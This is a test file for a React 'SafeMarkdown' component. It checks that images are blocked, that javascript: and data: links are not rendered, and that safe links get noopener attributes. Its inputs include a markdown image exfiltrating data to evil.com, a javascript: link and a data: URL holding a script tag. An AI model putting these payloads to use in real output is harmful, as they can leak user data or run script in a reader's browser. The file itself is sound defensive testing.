/**
 * Integration tests for SafeMarkdown component.
 * Verifies security behavior: image blocking, URL validation, rel attributes.
 */
import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { SafeMarkdown } from '../../src/ui/components/SafeMarkdown';

describe('SafeMarkdown', () => {
  it('renders plain markdown text', () => {
    render(<SafeMarkdown>{'**bold** and *italic*'}</SafeMarkdown>);
    expect(screen.getByText('bold')).toBeTruthy();
    expect(screen.getByText(/italic/)).toBeTruthy();
  });

  it('blocks img tags — renders nothing for images', () => {
    const { container } = render(
      <SafeMarkdown>{'![exfil](https://evil.com/steal?data=secret)'}</SafeMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
  });

  it('renders safe http links with rel="noopener noreferrer"', () => {
    render(<SafeMarkdown>{'[click](https://example.com)'}</SafeMarkdown>);
    const link = screen.getByRole('link', { name: 'click' });
    expect(link.getAttribute('href')).toBe('https://example.com');
    expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    expect(link.getAttribute('target')).toBe('_blank');
  });

  it('blocks javascript: URLs — renders as plain text', () => {
    const { container } = render(
      <SafeMarkdown>{'[xss](javascript:alert(1))'}</SafeMarkdown>,
    );
    // Should render as <span>, not <a>
    const links = container.querySelectorAll('a');
    expect(links.length).toBe(0);
    expect(screen.getByText('xss')).toBeTruthy();
  });

  it('blocks data: URLs', () => {
    const { container } = render(
      <SafeMarkdown>{'[data](data:text/html,<script>alert(1)</script>)'}</SafeMarkdown>,
    );
    expect(container.querySelectorAll('a').length).toBe(0);
  });

  it('allows http: links', () => {
    render(<SafeMarkdown>{'[http link](http://example.com)'}</SafeMarkdown>);
    const link = screen.getByRole('link', { name: 'http link' });
    expect(link.getAttribute('href')).toBe('http://example.com');
  });

  it('renders headings and lists', () => {
    const md = '## Title\n\n- item 1\n- item 2';
    const { container } = render(<SafeMarkdown>{md}</SafeMarkdown>);
    expect(container.querySelector('h2')?.textContent).toBe('Title');
    expect(container.querySelectorAll('li').length).toBe(2);
  });
});
